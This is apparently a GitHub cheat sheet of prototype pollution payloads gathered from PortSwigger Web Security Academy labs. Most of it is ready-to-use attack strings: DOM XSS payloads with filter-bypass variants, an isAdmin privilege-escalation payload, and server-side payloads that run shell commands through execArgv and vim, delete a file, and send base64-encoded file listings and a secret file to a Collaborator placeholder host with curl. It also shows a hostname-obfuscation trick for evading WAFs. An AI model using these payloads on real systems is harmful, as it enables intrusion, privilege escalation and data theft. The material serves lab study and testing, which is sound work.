# Prototype Pollution

## Summary

* [Recon for Prototype Pollution](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* Additional Note: There is a PDF attached in this folder that has a walk-through of the complete labs. The document does not need to be downloaded, it can be viewed inline in GitHub.

<br><br>

## Recon

* Links:

    * https://portswigger.net/web-security/prototype-pollution/client-side

    * https://portswigger.net/web-security/prototype-pollution/server-side

<br><br>

## Tools and Extensions Used:

* Server-Side Prototype Pollution Scanner - https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8

* DOM Invader (Client-side Prototype Pollution) - https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution

<br><br>

## Cheat Sheet

<br><br>

**Quick Reference:**

* Prototype pollution via the URL:

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```


<br>

* Prototype pollution via JSON input:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

```json
"constructor": {
    "prototype": {
        "evilProperty": "payload"
    }
}
```


<br><br>

### Client Side Pollution Examples

* Use DOM Invader to help with the exploitation process - https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution

<br>

### __Client-side Prototype Pollution - DOM XSS__

* Identify a prototype pollution source:
    
    * Inject an arbitrary property via a query string and determine if it has polluted the Object prototype:
	    
        * /?\_\_proto\_\_.foo=bar
	
        * /?\_\_proto\_\_[foo]=bar

    * Type the following in the browser's console and see if the Object has been polluted:
	
        * Object.prototype

* Identify a gadget:

    * Look through the clients-side source code and identify if there is an Object using a property in an insecure way.  For example, if we identify an object (config) using a property (transport_url) that is not defined, and used in a dangerous sink, we can try to pollute that property in the Object prototype:


    ```javascript
    if(config.transport_url) { 
	let script = document.createElement('script');
	script.src = config.transport_url;
	document.body.appendChild(script);
	}
    ```

* Craft an Exploit:

    * Use the source identified in the first step and attempt to pollute the "transport_url" property:
	
        * /?\_\_proto\_\_.transport_url=data:,alert(1);
	
        * /?\_\_proto\_\_[transport_url]=data:,alert(1);


* Other scenarios:

    * The client-side code may have some extra protections that are flawed, such as removing key words but not doing it recursively.

* Payloads to bypass this validation:

    * /?\_\_pro\_\_proto\_\_to\_\_[transport_url]=data:,alert(1);

    * /?\_\_pro\_\_proto\_\_to\_\_.transport_url=data:,alert(1);

    * /?constconstructorructor.[protoprototypetype][transport_url]=data:,alert(1);

    * /?constconstructorructor.protoprototypetype.transport_url=data:,alert(1);
 
* Another scenario:

	* The application is using the user input within an eval() function. To trigger an XSS vulnerability it is required "break" out of the context (use hyphens):

 		* Example Payload:  ?\_\_proto\_\_.sequence=-alert(1)-

<br><br>

### __Client-side Prototype Pollution - Third-party Libraries__

* Use DOM Invader to exploit these scenarios as it will save a lot of time.

* DOM Invader is pretty straight forward to use.

* Look at the solution for the following lab to learn more about it - https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries


<br><br>

### __Client-side Prototype Pollution - Browser APIs__

* Identify a prototype pollution source:

    * Inject an arbitrary property via a query string and determine if it has polluted the Object prototype.
	
        * /?\_\_proto\_\_.foo=bar
	
        * /?\_\_proto\_\_[foo]=bar

    * Type the following in the browser's console and see if the Object has been polluted:
	
        * Object.prototype


* Identify a gadget:

    * Look through the clients-side source code and identify if there is an Object using a property in an insecure way.

    * For example, the code is using the method Object.defineProperty() to define the property "transport_url", however, the "value" descriptor which is used to define the value associated with the property is not being defined:

```javascript
Object.defineProperty(config, 'transport_url', {
	configurable: false,
	writable: false
	// missing -> value: "test"
});
```

* The "config" Object is not defining the "value" descriptor for "transport_url" property, we can try to pollute the Object prototype with the "value" property containing a malicious payload.

* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty


* Craft an exploit:

    * /?\_\_proto\_\_[value]=data:,alert(1);

    * /?\_\_proto\_\_.value=data:,alert(1);



<br><br><br>

### Server Side Pollution Examples

* Use the Burp Extension for help with the exploitation process - https://github.com/portswigger/server-side-prototype-pollution

<br>

### __Server-side Prototype Pollution - Privilege Escalation__

* Identify functionality on the application where JSON data is returned in a response that appears to represent your "User" Object.

    * Example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":false
}
```

* Identify a prototype pollution source:

    * In the request body, add a new property to the JSON with the name \_\_proto\_\_, containing an object with an arbitrary property:

    * Example payload:

```json
"__proto__": {
	"foo":"bar"
}
```

* If in the response you see the "foo" property added, without the "\_\_proto\_\_" property, this suggests that we may have polluted the Object's prototype and that the "foo" property has been inherited via prototype chain.


* Identify a gadget:

    * The "isAdmin" property would be something to target for privilege escalation.


* Craft an Exploit:

    * Example payload:

```json
"__proto__": {
    "isAdmin":true
}
```

* In the response, if you see the following it suggests that the "User" object did not have its own "isAdmin“ property, and instead inherited from the polluted prototype.

    * Example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":true
}
```

* Other scenarios:

    * The application may be performing some filtering on the input, one way to bypass it is by using the constructor:

```json
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```



<br><br>


### __Detecting Prototype Pollution without Polluted Property Reflection__

* There are 3 main techniques:

    * Status code override

    * JSON spaces override

    * Charset override

* https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection

* Identify prototype pollution source:

    * JSON spaces technique:

```json
"__proto__":{
	"json spaces":10
}
```


* If the prototype pollution payload was successful, you can see a notable difference in the response, while not breaking the application's functionality.


* Burp Suite has an extension that can help to identify server-side prototype pollution:

    * Server-Side Prototype Pollution Scanner - https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8



<br><br>


### __Server-side Prototype Pollution - Remote Code Execution and Exfiltrate Sensitive Data__

* Payloads: (Inject these in JSON Body of HTTP requests)

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

<br>

* "Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you need to simulate this by including a newline (\n) character at the end of your payload, as shown in the examples."

```json
"shell":"vim",
"input":":! <command>\n"
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

<br>

* Exfiltrate data to Burp Collab:

```json
"__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

<br>

* "The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames."

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet or attached document.
